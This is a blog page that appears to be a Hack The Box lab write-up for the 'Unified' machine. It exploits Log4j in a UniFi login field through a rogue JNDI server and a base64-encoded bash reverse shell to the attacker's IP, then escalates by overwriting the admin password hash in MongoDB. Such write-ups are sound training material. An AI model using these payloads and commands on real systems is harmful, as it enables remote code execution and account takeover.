<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Unified Machine Notes | HTB Notes</title>
<meta name="keywords" content="">
<meta name="description" content="Start with scanning all the open ports on the host.
1. Nmap Scanning
nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial
note: before adding -oA scans/your_nmap_scan make sure you have scans/ folder otherwise nmap will give an error about non-existing directory.
Findings

Port 22 (SSH)
Port 6789 (ibm-db2-admin?)
Port 8080 (Apache Tomcat HTTP server)
Port 8443 (Nagios NSCA)

2. Enumeration
There are a lot of ports avaliable for us but let&rsquo;s visit http server first, it&rsquo;s easy.
Before that, start Burpsuite maybe it&rsquo;ll come in handy.
I will use chromium with proxy &#43; Burpsuite:">
<meta name="author" content="">
<link rel="canonical" href="https://hoverdd.github.io/htb-notes/posts/unified/">
<link crossorigin="anonymous" href="/htb-notes/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://hoverdd.github.io/htb-notes/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hoverdd.github.io/htb-notes/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hoverdd.github.io/htb-notes/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hoverdd.github.io/htb-notes/apple-touch-icon.png">
<link rel="mask-icon" href="https://hoverdd.github.io/htb-notes/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://hoverdd.github.io/htb-notes/posts/unified/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:url" content="https://hoverdd.github.io/htb-notes/posts/unified/">
  <meta property="og:site_name" content="HTB Notes">
  <meta property="og:title" content="Unified Machine Notes">
  <meta property="og:description" content="Start with scanning all the open ports on the host.
1. Nmap Scanning nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial note: before adding -oA scans/your_nmap_scan make sure you have scans/ folder otherwise nmap will give an error about non-existing directory.
Findings Port 22 (SSH) Port 6789 (ibm-db2-admin?) Port 8080 (Apache Tomcat HTTP server) Port 8443 (Nagios NSCA) 2. Enumeration There are a lot of ports avaliable for us but let’s visit http server first, it’s easy. Before that, start Burpsuite maybe it’ll come in handy. I will use chromium with proxy &#43; Burpsuite:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-07-11T09:00:32+03:00">
    <meta property="article:modified_time" content="2025-07-11T09:00:32+03:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Unified Machine Notes">
<meta name="twitter:description" content="Start with scanning all the open ports on the host.
1. Nmap Scanning
nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial
note: before adding -oA scans/your_nmap_scan make sure you have scans/ folder otherwise nmap will give an error about non-existing directory.
Findings

Port 22 (SSH)
Port 6789 (ibm-db2-admin?)
Port 8080 (Apache Tomcat HTTP server)
Port 8443 (Nagios NSCA)

2. Enumeration
There are a lot of ports avaliable for us but let&rsquo;s visit http server first, it&rsquo;s easy.
Before that, start Burpsuite maybe it&rsquo;ll come in handy.
I will use chromium with proxy &#43; Burpsuite:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://hoverdd.github.io/htb-notes/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Unified Machine Notes",
      "item": "https://hoverdd.github.io/htb-notes/posts/unified/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Unified Machine Notes",
  "name": "Unified Machine Notes",
  "description": "Start with scanning all the open ports on the host.\n1. Nmap Scanning nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial note: before adding -oA scans/your_nmap_scan make sure you have scans/ folder otherwise nmap will give an error about non-existing directory.\nFindings Port 22 (SSH) Port 6789 (ibm-db2-admin?) Port 8080 (Apache Tomcat HTTP server) Port 8443 (Nagios NSCA) 2. Enumeration There are a lot of ports avaliable for us but let\u0026rsquo;s visit http server first, it\u0026rsquo;s easy. Before that, start Burpsuite maybe it\u0026rsquo;ll come in handy. I will use chromium with proxy + Burpsuite:\n",
  "keywords": [
    
  ],
  "articleBody": "Start with scanning all the open ports on the host.\n1. Nmap Scanning nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial note: before adding -oA scans/your_nmap_scan make sure you have scans/ folder otherwise nmap will give an error about non-existing directory.\nFindings Port 22 (SSH) Port 6789 (ibm-db2-admin?) Port 8080 (Apache Tomcat HTTP server) Port 8443 (Nagios NSCA) 2. Enumeration There are a lot of ports avaliable for us but let’s visit http server first, it’s easy. Before that, start Burpsuite maybe it’ll come in handy. I will use chromium with proxy + Burpsuite:\nchromium --proxy-server=127.0.0.1:8080 \u0026 burpsuite Now go to 10.129.96.149:8080, it redirects us to :8443 port to login panel of UniFi service. Its version is 6.4.54. Let’s google the service for exploits.\nWe encounter an amazing article about attacking the target with UniFi network service (6.4.54).\nThe Ubiquiti UniFi Network Application v6.5.54 are affected by the Log4j vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the server application. So let’s test this vulnerability and send test payload: It’s important that you check the remember button, otherwise it won’t appear in payload. To access our login request in Burp we need to enable Interception in Proxy tab. And only then when we submit the form Burpsuite will show our request, then we can send it to Repeater to edit it. Take the payload from the article and edit it to meet your needs:\nremember: \"${jndi:ldap://10.10.14.143/something}\" Why are we doing this??\nLDAP - Lightweight Directory Access Protocol, it’s used to manage directory info services, such as user accounts, passwords, and other network resources. JNDI is the acronym for the Java Naming and Directory Interface API. By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.\nWe need to see what server does after some user trying to connect to it. First, let’s start tcpdump. It’s a tool that allows to capture and display network traffic. We want it to capture it on tun0 interface, because that’s what we typed after jndi:ldap://.\nsudo tcpdump -i tun0 port 389 Port 389 is default for LDAP services. Response tells us that is something wrong with our payload, but it executes it anyway, let’s see the output from tcpdump: We see that ldap server is trying to connect back to us, let’s use it!!\n10.10.14.143.ldap \u003e 10.129.96.149.58106 3. Exploitation There is ready LDAP server that we can download, compile and use against our target. On your machine run:\ngit clone https://github.com/veracode-research/rogue-jndi.git cd rogue-jndi/ mvn package If you don’t have java or openjdk, maven, just install it with apt:\nsudo apt update sudo apt install openjdk-11-jdk # Check java version java -version Then install maven:\nsudo apt install maven # Check maven version mvn -v We are going to use this command for starting the JNDI server (it’s from article):\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \"bash -c {echo,YOUR_BASE64_HASH}|{base64,-d}|{bash,-i}\" --hostname \"YOUR_IP\" Let’s create our reverse shell and encode it in base64 to avoid encoding issues.\necho 'bash -c bash -i \u003e\u0026/dev/tcp/10.10.14.143/4444 0\u003e\u00261' | base64 I recommend using MousePad for temporary notes. Now your command should look like this:\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}\" --hostname \"10.10.14.143\" Start netcat listener on port you chose when created base64 encoded reverse shell script.\nnc -lvnp 4444 Before starting the LDAP server, make sure you exited from rogue-jndi dir. We need to send request on jndi:ldap://10.10.14.143:1389/o=tomcat, edit your payload so it looks like this: After sending the request we should see this message from our LDAP server: Let’s check out netcat listener. Yay!! nc recieved connection! To upgrade the shell run this command:\nscript /dev/null -c bash Now we can check /home folder for users and grab our flag at /home/michael/user.txt.\n4. Privelege Escalation Also there is a MongoDB instance somewhere and we need to find it with:\nps aux | grep mongo MongoDB is running at port 27117. Google tells us that the default database name for UniFi applications is ace. Let’s enumerate the info in mongodb:\nmongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\" --port flag specifies the port for mongodb instance --eval simply tells mongo to execute command in quotes. ace is the database we want to look into We need to look for administrator user. As we can see x_shadow key stores SHA-512 hash and it will take time to crack it. So why don’t change it for a password we will know? Copy the ObjectId field for administrator user, it’ll be useful. Let’s create our own password:\nmkpasswd -m sha-512 qwerty123 Copy it somewhere. Take this string and edit it with your data:\nmongo --port 27117 ace --eval 'db.admin.update({\"_id\" : ObjectId(\"ADMIN_OBJECT_ID\")},{$set:{\"x_shadow\": \"YOUR_MKPASSWD_OUTPUT\"}})' It should look like this:\nmongo --port 27117 ace --eval 'db.admin.update({\"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\": \"$6$aYHpsRQ78FrtJ6NJ$Mri/BKD2gUgEXzRrTd/os08R2uoOx8ZlT8Jgoz7eeotzeTXo6YLMiTGmtbmpjoRqFL.cJqBoavSz2wQVddY860\"}})' Now we have updated admin’s password and can visit admin dashboard! Creds: administrator:qwerty123 Aaand we got in!!! Let’s go to Settings and look for SSH root password. It’s NotACrackablePassword4U2022. Connect as a root to 10.129.96.149. We got the flag!!! \u003e_\u003c This machine was very interesting!!\n",
  "wordCount" : "885",
  "inLanguage": "en",
  "datePublished": "2025-07-11T09:00:32+03:00",
  "dateModified": "2025-07-11T09:00:32+03:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hoverdd.github.io/htb-notes/posts/unified/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "HTB Notes",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hoverdd.github.io/htb-notes/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hoverdd.github.io/htb-notes/" accesskey="h" title="HTB Notes (Alt + H)">HTB Notes</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hoverdd.github.io/htb-notes/about/" title="About me">
                    <span>About me</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Unified Machine Notes
    </h1>
    <div class="post-meta"><span title='2025-07-11 09:00:32 +0300 MSK'>July 11, 2025</span>

</div>
  </header> 
  <div class="post-content"><p>Start with scanning all the open ports on the host.</p>
<h2 id="1-nmap-scanning">1. Nmap Scanning<a hidden class="anchor" aria-hidden="true" href="#1-nmap-scanning">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 10.129.96.149 -sC -sV --open -oA scans/nmap_initial
</span></span></code></pre></div><p><em>note</em>: before adding <code>-oA scans/your_nmap_scan</code> make sure you have <code>scans/</code> folder otherwise <code>nmap</code> will give an error about non-existing directory.</p>
<h3 id="findings">Findings<a hidden class="anchor" aria-hidden="true" href="#findings">#</a></h3>
<ul>
<li>Port 22 (SSH)</li>
<li>Port 6789 (ibm-db2-admin?)</li>
<li>Port 8080 (Apache Tomcat HTTP server)</li>
<li>Port 8443 (Nagios NSCA)</li>
</ul>
<h2 id="2-enumeration">2. Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-enumeration">#</a></h2>
<p>There are a lot of ports avaliable for us but let&rsquo;s visit http server first, it&rsquo;s easy.
Before that, start Burpsuite maybe it&rsquo;ll come in handy.
I will use chromium with proxy + Burpsuite:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chromium --proxy-server<span style="color:#f92672">=</span>127.0.0.1:8080 &amp;
</span></span><span style="display:flex;"><span>burpsuite
</span></span></code></pre></div><p>Now go to <code>10.129.96.149:8080</code>, it redirects us to <code>:8443</code> port to login panel of UniFi service. Its version is <code>6.4.54</code>. Let&rsquo;s google the service for exploits.</p>
<p><img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.19.24%E2%80%AFAM.png">
We encounter an amazing article about attacking the target with UniFi network service (6.4.54).</p>
<pre tabindex="0"><code>The Ubiquiti UniFi Network Application v6.5.54 are affected by the Log4j
vulnerability whereby a JNDI string can be sent to the server via the &#39;remember&#39; field of a POST request to the
/api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java
object. This results in OS command execution in the context of the server application.
</code></pre><p>So let&rsquo;s test this vulnerability and send test payload:
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.29.04%E2%80%AFAM.png">
It&rsquo;s important that you check the <code>remember</code> button, otherwise it won&rsquo;t appear in payload.
To access our login request in Burp we need to enable Interception in Proxy tab.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.32.44%E2%80%AFAM.png">
And only then when we submit the form Burpsuite will show our request, then we can send it to Repeater to edit it.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.33.11%E2%80%AFAM.png">
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.34.25%E2%80%AFAM.png">
Take the payload from the article and edit it to meet your needs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>remember: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>jndi:ldap://10.10.14.143/something<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>Why are we doing this??</p>
<p>LDAP - Lightweight Directory Access Protocol, it&rsquo;s used to manage directory info services, such as user accounts, passwords, and other network resources.
JNDI is the acronym for the Java Naming and Directory Interface API. By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.</p>
<p>We need to see what server does after some user trying to connect to it.
First, let&rsquo;s start <code>tcpdump</code>. It&rsquo;s a tool that allows to capture and display network traffic. We want it to capture it on <code>tun0</code> interface, because that&rsquo;s what we typed after <code>jndi:ldap://</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo tcpdump -i tun0 port <span style="color:#ae81ff">389</span>
</span></span></code></pre></div><p>Port <code>389</code> is default for LDAP services.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.47.48%E2%80%AFAM-1.png">
Response tells us that is something wrong with our payload, but it executes it anyway, let&rsquo;s see the output from <code>tcpdump</code>:
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%209.51.14%E2%80%AFAM.png">
We see that ldap server is trying to connect back to us, let&rsquo;s use it!!</p>
<pre tabindex="0"><code>10.10.14.143.ldap &gt; 10.129.96.149.58106
</code></pre><h2 id="3-exploitation">3. Exploitation<a hidden class="anchor" aria-hidden="true" href="#3-exploitation">#</a></h2>
<p>There is ready LDAP server that we can download, compile and use against our target.
On your machine run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/veracode-research/rogue-jndi.git
</span></span><span style="display:flex;"><span>cd rogue-jndi/
</span></span><span style="display:flex;"><span>mvn package
</span></span></code></pre></div><p>If you don&rsquo;t have <code>java</code> or <code>openjdk</code>, <code>maven</code>, just install it with apt:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
</span></span><span style="display:flex;"><span>sudo apt install openjdk-11-jdk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check java version</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>java -version
</span></span></code></pre></div><p>Then install <code>maven</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install maven
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check maven version</span>
</span></span><span style="display:flex;"><span>mvn -v
</span></span></code></pre></div><p>We are going to use this command for starting the JNDI server (it&rsquo;s from article):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command <span style="color:#e6db74">&#34;bash -c {echo,YOUR_BASE64_HASH}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span style="color:#e6db74">&#34;YOUR_IP&#34;</span>
</span></span></code></pre></div><p>Let&rsquo;s create our reverse shell and encode it in base64 to avoid encoding issues.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.143/4444 0&gt;&amp;1&#39;</span> |
</span></span><span style="display:flex;"><span>base64
</span></span></code></pre></div><p>I recommend using MousePad for temporary notes.
Now your command should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command <span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span style="color:#e6db74">&#34;10.10.14.143&#34;</span>
</span></span></code></pre></div><p>Start netcat listener on port you chose when created base64 encoded reverse shell script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>Before starting the LDAP server, make sure you exited from <code>rogue-jndi</code> dir.
We need to send request on <code>jndi:ldap://10.10.14.143:1389/o=tomcat</code>, edit your payload so it looks like this:
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.09.12%E2%80%AFAM.png">
After sending the request we should see this message from our LDAP server:
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.09.51%E2%80%AFAM.png">
Let&rsquo;s check out netcat listener.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.10.44%E2%80%AFAM.png">
Yay!! <code>nc</code> recieved connection!
To upgrade the shell run this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.15.30%E2%80%AFAM.png">
Now we can check <code>/home</code> folder for users and grab our flag at <code>/home/michael/user.txt</code>.</p>
<h2 id="4-privelege-escalation">4. Privelege Escalation<a hidden class="anchor" aria-hidden="true" href="#4-privelege-escalation">#</a></h2>
<p>Also there is a MongoDB instance somewhere and we need to find it with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps aux | grep mongo
</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.17.46%E2%80%AFAM.png">
MongoDB is running at port <code>27117</code>. Google tells us that the default database name for UniFi applications is <code>ace</code>. Let&rsquo;s enumerate the info in mongodb:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mongo --port <span style="color:#ae81ff">27117</span> ace --eval <span style="color:#e6db74">&#34;db.admin.find().forEach(printjson);&#34;</span>
</span></span></code></pre></div><p><code>--port</code> flag specifies the port for mongodb instance
<code>--eval</code> simply tells mongo to execute command in quotes.
<code>ace</code> is the database we want to look into
We need to look for administrator user.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.24.27%E2%80%AFAM.png">
As we can see <code>x_shadow</code> key stores SHA-512 hash and it will take time to crack it. So why don&rsquo;t change it for a password we will know?
Copy the <code>ObjectId</code> field for administrator user, it&rsquo;ll be useful.
Let&rsquo;s create our own password:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkpasswd -m sha-512 qwerty123
</span></span></code></pre></div><p>Copy it somewhere. Take this string and edit it with your data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mongo --port <span style="color:#ae81ff">27117</span> ace --eval <span style="color:#e6db74">&#39;db.admin.update({&#34;_id&#34; : ObjectId(&#34;ADMIN_OBJECT_ID&#34;)},{$set:{&#34;x_shadow&#34;: &#34;YOUR_MKPASSWD_OUTPUT&#34;}})&#39;</span>
</span></span></code></pre></div><p>It should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mongo --port <span style="color:#ae81ff">27117</span> ace --eval <span style="color:#e6db74">&#39;db.admin.update({&#34;_id&#34; : ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;: &#34;$6$aYHpsRQ78FrtJ6NJ$Mri/BKD2gUgEXzRrTd/os08R2uoOx8ZlT8Jgoz7eeotzeTXo6YLMiTGmtbmpjoRqFL.cJqBoavSz2wQVddY860&#34;}})&#39;</span>
</span></span></code></pre></div><p>Now we have updated admin&rsquo;s password and can visit admin dashboard! Creds: <code>administrator:qwerty123</code>
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.35.15%E2%80%AFAM.png">
Aaand we got in!!!
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.35.51%E2%80%AFAM.png">
Let&rsquo;s go to Settings and look for SSH root password.
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.36.28%E2%80%AFAM.png">
It&rsquo;s <code>NotACrackablePassword4U2022</code>. Connect as a root to <code>10.129.96.149</code>.
We got the flag!!! &gt;_&lt;
<img alt="alt text" loading="lazy" src="/htb-notes/posts/unified/screenshots/Screenshot%202025-07-11%20at%2010.38.33%E2%80%AFAM.png">
This machine was very interesting!!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://hoverdd.github.io/htb-notes/">HTB Notes</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
